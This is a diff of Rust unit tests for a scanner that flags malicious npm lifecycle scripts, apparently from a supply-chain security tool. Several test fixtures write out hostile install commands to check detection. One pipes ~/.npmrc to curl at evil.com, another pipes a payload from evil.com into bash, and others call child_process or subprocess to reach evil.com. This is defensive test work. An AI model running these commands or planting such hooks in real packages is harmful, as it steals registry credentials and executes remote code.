-            other => panic!("expected Suspicious, got {other:?}"),
-        }
-    }
-
-    // ================================================================
-    // 10. Error — malformed package.json
-    // ================================================================
-
-    #[test]
-    fn malformed_package_json() {
-        let dir = tempfile::tempdir().expect("tempdir");
-        std::fs::write(dir.path().join("package.json"), "{ not valid json !!!").unwrap();
-
-        let result = scan_package(dir.path(), &[]);
-        assert!(result.is_err(), "malformed JSON should produce an error");
-    }
-
-    // ================================================================
-    // 11. Error — missing package.json
-    // ================================================================
-
-    #[test]
-    fn missing_package_json() {
-        let dir = tempfile::tempdir().expect("tempdir");
-        // Don't create a package.json
-
-        let result = scan_package(dir.path(), &[]);
-        assert!(
-            result.is_err(),
-            "missing package.json should produce an error"
-        );
-    }
-
-    // ================================================================
-    // 12. Preinstall detection
-    // ================================================================
-
-    #[test]
-    fn preinstall_detection() {
-        let dir = tempfile::tempdir().expect("tempdir");
-        let scripts = serde_json::json!({
-            "preinstall": "node -e \"require('child_process').exec('whoami')\""
-        });
-        make_package(dir.path(), "pre-evil", "0.0.1", Some(&scripts));
-
-        let result = scan_package(dir.path(), &[]).unwrap();
-        match &result {
-            LifecycleRisk::Critical {
-                script_name,
-                indicators,
-                ..
-            } => {
-                assert_eq!(script_name, "preinstall");
-                assert!(indicators.iter().any(|i| i.contains("child_process")));
-            }
-            other => panic!("expected Critical, got {other:?}"),
-        }
-    }
-
-    // ================================================================
-    // 13. Script file content scanning
-    // ================================================================
-
-    #[test]
-    fn script_file_content_scanned() {
-        let dir = tempfile::tempdir().expect("tempdir");
-        let scripts = serde_json::json!({
-            "postinstall": "node scripts/install.js"
-        });
-        make_package(dir.path(), "file-evil", "0.0.1", Some(&scripts));
-
-        // Create the referenced script file with critical content
-        std::fs::create_dir_all(dir.path().join("scripts")).unwrap();
+        let pkg_json = dir.path().join("package.json");
         std::fs::write(
-            dir.path().join("scripts/install.js"),
-            "const { exec } = require('child_process');\nexec('curl evil.com');",
+            &pkg_json,
+            r#"{"scripts":{"preinstall":"node scripts/big.js"}}"#,
         )
-        .unwrap();
+        .expect("write");
 
-        let result = scan_package(dir.path(), &[]).unwrap();
+        let scripts_dir = dir.path().join("scripts");
+        std::fs::create_dir(&scripts_dir).expect("mkdir");
+        let big_script = scripts_dir.join("big.js");
+        let oversized = "x".repeat(6 * 1024 * 1024); // 6MB > 5MB limit
+        std::fs::write(&big_script, &oversized).expect("write");
+
+        let result = scan_package(dir.path());
         assert!(
-            matches!(result, LifecycleRisk::Critical { .. }),
-            "expected Critical from file content, got {result:?}"
-        );
-    }
-
-    // ================================================================
-    // 14. Extract script file path
-    // ================================================================
-
-    #[test]
-    fn extract_script_file_path_node_js() {
-        assert_eq!(
-            extract_script_file_path("node scripts/postinstall.js"),
-            Some("scripts/postinstall.js".to_string())
-        );
-        assert_eq!(
-            extract_script_file_path("node install.mjs"),
-            Some("install.mjs".to_string())
-        );
-        assert_eq!(
-            extract_script_file_path("node lib/setup.cjs"),
-            Some("lib/setup.cjs".to_string())
+            result.warnings.iter().any(|w| w.contains("oversized")),
+            "oversized script should generate a warning"
         );
     }
 
     #[test]
-    fn extract_script_file_path_non_node() {
+    fn test_bounded_read_normal_file() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let file = dir.path().join("test.txt");
+        std::fs::write(&file, "hello").expect("write");
+
+        let content = bounded_read_to_string(&file, 1024);
+        assert!(content.is_ok());
+        assert_eq!(content.unwrap(), "hello");
+    }
+
+    #[test]
+    fn test_bounded_read_oversized() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let file = dir.path().join("big.txt");
+        std::fs::write(&file, "hello world").expect("write");
+
+        let result = bounded_read_to_string(&file, 5);
+        assert!(matches!(result, Err(ReadError::Oversized(_))));
+    }
+
+    // --- Script file path extraction ---
+
+    #[test]
+    fn test_extract_node_script_path() {
+        assert_eq!(
+            extract_script_file_path("node scripts/install.js"),
+            Some("scripts/install.js".to_string())
+        );
+    }
+
+    #[test]
+    fn test_extract_node_with_flags() {
+        assert_eq!(
+            extract_script_file_path("node --experimental-modules scripts/install.mjs"),
+            Some("scripts/install.mjs".to_string())
+        );
+    }
+
+    #[test]
+    fn test_extract_sh_script_path() {
+        assert_eq!(
+            extract_script_file_path("sh scripts/install.sh"),
+            Some("scripts/install.sh".to_string())
+        );
+    }
+
+    #[test]
+    fn test_extract_bash_script_path() {
+        assert_eq!(
+            extract_script_file_path("bash scripts/setup.sh"),
+            Some("scripts/setup.sh".to_string())
+        );
+    }
+
+    #[test]
+    fn test_extract_python_script_path() {
+        assert_eq!(
+            extract_script_file_path("python3 install.py"),
+            Some("install.py".to_string())
+        );
+    }
+
+    #[test]
+    fn test_extract_python2_script_path() {
+        assert_eq!(
+            extract_script_file_path("python install.py"),
+            Some("install.py".to_string())
+        );
+    }
+
+    #[test]
+    fn test_extract_unknown_runner() {
         assert_eq!(extract_script_file_path("echo hello"), None);
-        assert_eq!(extract_script_file_path("sh install.sh"), None);
+        assert_eq!(extract_script_file_path("custom-runner script.js"), None);
+    }
+
+    #[test]
+    fn test_extract_empty_script() {
+        assert_eq!(extract_script_file_path(""), None);
+    }
+
+    #[test]
+    fn test_extract_runner_only() {
+        // Just the runner with no file path
         assert_eq!(extract_script_file_path("node"), None);
     }
 
-    // ================================================================
-    // Lockfile utilities
-    // ================================================================
+    #[test]
+    fn test_extract_runner_with_only_flags() {
+        assert_eq!(extract_script_file_path("node --version"), None);
+    }
+
+    // --- Full scan integration tests ---
 
     #[test]
-    fn lockfile_names_complete() {
-        assert!(LOCKFILE_NAMES.contains(&"package-lock.json"));
-        assert!(LOCKFILE_NAMES.contains(&"yarn.lock"));
-        assert!(LOCKFILE_NAMES.contains(&"pnpm-lock.yaml"));
-        assert!(LOCKFILE_NAMES.contains(&"bun.lockb"));
-        assert_eq!(LOCKFILE_NAMES.len(), 4);
+    fn test_scan_clean_package() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let pkg_json = dir.path().join("package.json");
+        std::fs::write(
+            &pkg_json,
+            r#"{"name": "clean-pkg", "scripts": {"build": "tsc"}}"#,
+        )
+        .expect("write");
+
+        let result = scan_package(dir.path());
+        assert_eq!(result.risk, RiskLevel::Low);
+        assert!(result.findings.is_empty());
     }
 
     #[test]
-    fn lockfile_change_expected_returns_true() {
-        // Current stub always returns true
-        assert!(is_lockfile_change_expected(Path::new("package-lock.json")));
+    fn test_scan_malicious_preinstall() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let pkg_json = dir.path().join("package.json");
+        std::fs::write(
+            &pkg_json,
+            r#"{"scripts": {"preinstall": "node -e \"require('child_process').exec('curl http://evil.com')\""}}"#,
+        )
+        .expect("write");
+
+        let result = scan_package(dir.path());
+        assert!(result.risk >= RiskLevel::High);
+        assert!(!result.findings.is_empty());
     }
 
-    // ================================================================
-    // LifecycleRisk equality
-    // ================================================================
+    #[test]
+    fn test_scan_with_script_file() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let pkg_json = dir.path().join("package.json");
+        std::fs::write(
+            &pkg_json,
+            r#"{"scripts": {"postinstall": "node scripts/setup.js"}}"#,
+        )
+        .expect("write");
+
+        let scripts_dir = dir.path().join("scripts");
+        std::fs::create_dir(&scripts_dir).expect("mkdir");
+        std::fs::write(
+            scripts_dir.join("setup.js"),
+            r"
+            const cp = require('child_process');
+            cp.execSync('cat ~/.npmrc | curl -d @- http://evil.com');
+            ",
+        )
+        .expect("write");
+
+        let result = scan_package(dir.path());
+        assert!(result.risk >= RiskLevel::Critical);
+        assert!(result.findings.iter().any(|f| f.source.contains("file:")));
+    }
 
     #[test]
-    fn lifecycle_risk_equality() {
-        assert_eq!(LifecycleRisk::Clean, LifecycleRisk::Clean);
-        assert_ne!(
-            LifecycleRisk::Clean,
-            LifecycleRisk::AllowListed {
-                package: "x".to_string()
-            }
+    fn test_scan_missing_package_json() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let result = scan_package(dir.path());
+        assert_eq!(result.risk, RiskLevel::Low);
+        assert!(!result.warnings.is_empty());
+    }
+
+    #[test]
+    fn test_scan_invalid_json() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        std::fs::write(dir.path().join("package.json"), "not json").expect("write");
+        let result = scan_package(dir.path());
+        assert!(!result.warnings.is_empty());
+        assert!(result.warnings[0].contains("parse"));
+    }
+
+    #[test]
+    fn test_scan_sh_script_file() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        std::fs::write(
+            dir.path().join("package.json"),
+            r#"{"scripts": {"preinstall": "sh scripts/install.sh"}}"#,
+        )
+        .expect("write");
+
+        let scripts_dir = dir.path().join("scripts");
+        std::fs::create_dir(&scripts_dir).expect("mkdir");
+        std::fs::write(
+            scripts_dir.join("install.sh"),
+            "curl http://evil.com/payload |bash",
+        )
+        .expect("write");
+
+        let result = scan_package(dir.path());
+        assert!(result.risk >= RiskLevel::Critical);
+        assert!(result.findings.iter().any(|f| f.source.contains("file:")));
+    }
+
+    #[test]
+    fn test_scan_python_script_file() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        std::fs::write(
+            dir.path().join("package.json"),
+            r#"{"scripts": {"postinstall": "python3 setup.py"}}"#,
+        )
+        .expect("write");
+
+        std::fs::write(
+            dir.path().join("setup.py"),
+            "import subprocess; subprocess.run(['curl', 'http://evil.com'])",
+        )
+        .expect("write");
+
+        let result = scan_package(dir.path());
+        assert!(result.risk >= RiskLevel::High);
+    }
+
+    // --- Risk level tests ---
+
+    #[test]
+    fn test_risk_level_ordering() {
+        assert!(RiskLevel::Low < RiskLevel::Medium);
+        assert!(RiskLevel::Medium < RiskLevel::High);
+        assert!(RiskLevel::High < RiskLevel::Critical);
+    }
+
+    #[test]
+    fn test_risk_level_display() {
+        assert_eq!(format!("{}", RiskLevel::Low), "low");
+        assert_eq!(format!("{}", RiskLevel::Critical), "critical");
+    }
+
+    // --- Lifecycle script coverage ---
+
+    #[test]
+    fn test_all_lifecycle_scripts_checked() {
+        // Verify we check all important lifecycle scripts
+        assert!(LIFECYCLE_SCRIPTS.contains(&"preinstall"));
+        assert!(LIFECYCLE_SCRIPTS.contains(&"install"));
+        assert!(LIFECYCLE_SCRIPTS.contains(&"postinstall"));
+        assert!(LIFECYCLE_SCRIPTS.contains(&"prepublish"));
+    }
+
+    #[test]
+    fn test_non_lifecycle_scripts_ignored() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        std::fs::write(
+            dir.path().join("package.json"),
+            r#"{"scripts": {"build": "eval('something')", "test": "exec('cmd')"}}"#,
+        )
+        .expect("write");
+
+        let result = scan_package(dir.path());
+        // build and test are not lifecycle scripts, so they should not generate findings
+        assert!(
+            result.findings.is_empty(),
+            "non-lifecycle scripts should not be scanned: {:?}",
+            result.findings
         );
-        assert_eq!(
-            LifecycleRisk::AllowListed {
-                package: "a".to_string()
-            },
-            LifecycleRisk::AllowListed {
-                package: "a".to_string()
-            }
-        );
-    }
-
-    // ================================================================
-    // Critical patterns constant coverage
-    // ================================================================
-
-    #[test]
-    fn all_critical_patterns_detected() {
-        for &pattern in CRITICAL_SCRIPT_PATTERNS {
-            let dir = tempfile::tempdir().expect("tempdir");
-            let script_content = format!("node -e \"{pattern}\"");
-            let scripts = serde_json::json!({
-                "postinstall": script_content
-            });
-            make_package(dir.path(), "pattern-test", "0.0.1", Some(&scripts));
-
-            let result = scan_package(dir.path(), &[]).unwrap();
-            assert!(
-                matches!(result, LifecycleRisk::Critical { .. }),
-                "pattern `{pattern}` should produce Critical, got {result:?}"
-            );
-        }
-    }
-
-    #[test]
-    fn all_warning_patterns_detected() {
-        for &pattern in WARNING_SCRIPT_PATTERNS {
-            let dir = tempfile::tempdir().expect("tempdir");
-            let script_content = format!("echo {pattern}");
-            let scripts = serde_json::json!({
-                "postinstall": script_content
-            });
-            make_package(dir.path(), "warning-test", "0.0.1", Some(&scripts));
-
-            let result = scan_package(dir.path(), &[]).unwrap();
-            assert!(
-                matches!(
-                    result,
-                    LifecycleRisk::Suspicious { .. } | LifecycleRisk::Critical { .. }
-                ),
-                "pattern `{pattern}` should produce at least Suspicious, got {result:?}"
-            );
-        }
     }
 }
